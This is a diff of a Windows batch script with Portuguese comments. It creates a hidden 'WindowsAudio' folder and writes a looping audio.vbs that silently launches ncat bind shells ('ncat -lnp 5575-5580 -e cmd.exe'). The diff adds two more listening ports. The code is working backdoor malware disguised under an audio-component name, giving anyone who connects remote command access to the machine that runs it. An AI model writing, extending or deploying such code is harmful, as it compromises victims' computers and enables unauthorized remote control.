@@ -18,10 +18,12 @@ attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1
 
 :: Criar audio.vbs
 echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5576 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5577 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5578 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5579 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 5580 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"
 
 :: Criar audio.bat
